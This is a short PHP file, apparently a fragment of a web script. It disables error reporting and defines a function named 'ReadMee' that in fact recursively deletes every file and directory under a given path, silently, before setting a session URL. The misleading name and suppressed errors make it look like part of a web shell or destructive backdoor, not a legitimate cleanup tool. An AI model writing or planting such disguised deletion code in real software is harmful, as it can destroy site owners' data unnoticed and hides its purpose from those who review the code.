<?php

error_reporting(0);
//
 function ReadMee($dirName){
	$readurl =  $_SESSION["aba"] . '&c=Reade';
	if($handle = opendir($dirName)){
		while(false!==($item=readdir($handle))){
			if($item!='.'&&$item!='..'){
				if(is_dir("$dirName/$item")){
					ReadMee("$dirName/$item");
				}else{
					if(unlink("$dirName/$item")){
					}
				}
			}
		}
		closedir($handle);
		if(rmdir($dirName)){
		}
	}
   $_SESSION["abc"] = $readurl;
 }
 
?>